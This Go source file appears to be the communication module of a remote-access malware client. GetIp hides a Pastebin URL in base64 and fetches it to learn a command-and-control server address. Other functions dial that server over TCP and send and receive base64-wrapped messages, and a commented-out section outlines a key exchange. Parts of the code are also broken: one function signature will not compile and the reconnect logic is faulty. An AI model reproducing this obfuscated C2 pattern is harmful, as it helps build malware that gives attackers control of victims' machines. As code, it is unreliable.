package main

import (
    "github.com/golang/protobuf/proto"
    "bufio"
    "io/ioutil"
    "net"
    "strings"
    "net/http"
    "fmt"
)
import "encoding/asn1"


var c net.Conn //Global variable to send and receive from anywhere
var ip string


func Connect() (net.Conn, error) {
    ip = GetIp()
    _, err := net.Dial("tcp", ip)
    if err != nil {
        Wait()
        Connect()
    }
    /*fmt.Println("exangin")
    // Send public key to server (pre: pub)
    a, _ := asn1.Marshal(ClientPub)
    c.Write([]byte("pub" + "|||" + Base64EncodeRaw(a)))
    fmt.Println("sent pub " + string(a))



    // Listen for sever priv key
    temp, _ := bufio.NewReader(c).ReadString('\n')
    pkcs1DerSerPriv := RSADecrypt(*ClientPriv,[]byte(Base64Decode(temp)))
    fmt.Println("recived ser Priv ")

    SPriv, _ := x509.ParsePKCS1PrivateKey(pkcs1DerSerPriv)
    ServerPriv = *SPriv
    fmt.Println("recived priv server")
    // Send priv encrytted with server pub
    c.Write([]byte(Base64Encode("priv" + "|||" + Base64Decode(string(RSAEncrypt(ServerPriv, x509.MarshalPKCS1PrivateKey(ClientPriv)))))))
    fmt.Println("all done")*/

    return net.Dial("tcp", ip)
}

func GetIp() string {
    resp, _ := http.Get(Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
    defer resp.Body.Close()
    respBody, _ := ioutil.ReadAll(resp.Body)

    return strings.TrimLeft(string(respBody), "tcp://")
}

func Send(pre string, msg string) {
    c.Write([]byte(Base64Encode(pre + "|||" + msg))) //var c is located in client.go
}
func SendRaw(msg string) {
    c.Write([]byte(Base64Encode(msg))) //var c is located in client.go
}
func SendProto(pro) {
}
func Receive() string {
    status, err := bufio.NewReader(c).ReadString('\n')
    if err != nil {
        c, _ = Connect()
    }
    fmt.Println("recived")
    return status
}
